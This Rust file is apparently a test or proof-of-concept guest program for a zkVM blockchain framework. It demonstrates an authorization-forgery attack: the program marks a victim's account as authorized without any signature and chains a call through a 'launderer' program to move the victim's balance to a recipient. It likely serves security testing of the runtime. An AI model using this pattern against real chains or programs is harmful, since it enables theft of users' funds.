use nssa_core::{
    account::{Account, AccountId, AccountWithMetadata, Data, Nonce},
    program::{
        AccountPostState, ChainedCall, ProgramId, ProgramInput, ProgramOutput, read_nssa_inputs,
    },
};

/// Instruction uses only risc0-serde-compatible primitives — no `AccountId`/`Account` structs,
/// which use `SerializeDisplay`/`DeserializeFromStr` and cannot round-trip through
/// `instruction_data`.
///
/// Fields:
///   `p2_id`:                  program ID of the launderer (P2)
///   `auth_transfer_id`:       program ID of `authenticated_transfer`, forwarded to P2
///   `victim_id_raw`:          raw `[u8; 32]` of the victim `AccountId`
///   `victim_balance`:         victim's current balance
///   `victim_nonce`:           victim's current nonce (inner `u128`)
///   `victim_program_owner`:   victim account's `program_owner` field
///   `recipient_id_raw`:       raw `[u8; 32]` of the recipient `AccountId`
///   `amount`:                 balance to transfer out of the victim.
type Instruction = (
    ProgramId,
    ProgramId,
    [u8; 32],
    u128,
    u128,
    ProgramId,
    [u8; 32],
    u128,
);

fn main() {
    let (
        ProgramInput {
            self_program_id,
            caller_program_id,
            pre_states,
            instruction:
                (
                    p2_id,
                    auth_transfer_id,
                    victim_id_raw,
                    victim_balance,
                    victim_nonce,
                    victim_program_owner,
                    recipient_id_raw,
                    amount,
                ),
        },
        instruction_words,
    ) = read_nssa_inputs::<Instruction>();

    // Echo own pre_states (attacker's account) unchanged.
    let post_states = pre_states
        .iter()
        .map(|p| AccountPostState::new(p.account.clone()))
        .collect();

    // Construct victim AccountWithMetadata from primitives, stamping is_authorized=true.
    // Victim has not signed anything — this flag is forged entirely by P1's logic.
    let victim = AccountWithMetadata {
        account: Account {
            program_owner: victim_program_owner,
            balance: victim_balance,
            data: Data::default(),
            nonce: Nonce(victim_nonce),
        },
        is_authorized: true,
        account_id: AccountId::new(victim_id_raw),
    };

    // Recipient is already initialized under authenticated_transfer (program_owner =
    // auth_transfer_id, balance = 0). Using the default account would trigger
    // Claim::Authorized inside authenticated_transfer, which requires is_authorized=true
    // on the recipient — a check that would block the transfer.
    let recipient = AccountWithMetadata {
        account: Account {
            program_owner: auth_transfer_id,
            balance: 0,
            data: Data::default(),
            nonce: Nonce(0),
        },
        is_authorized: false,
        account_id: AccountId::new(recipient_id_raw),
    };

    // Forward auth_transfer_id and amount to P2 so it can call authenticated_transfer.
    let p2_instruction = risc0_zkvm::serde::to_vec(&(auth_transfer_id, amount))
        .expect("serialization is infallible");

    ProgramOutput::new(
        self_program_id,
        caller_program_id,
        instruction_words,
        pre_states,
        post_states,
    )
    .with_chained_calls(vec![ChainedCall {
        program_id: p2_id,
        pre_states: vec![victim, recipient],
        instruction_data: p2_instruction,
        pda_seeds: vec![],
    }])
    .write();
}
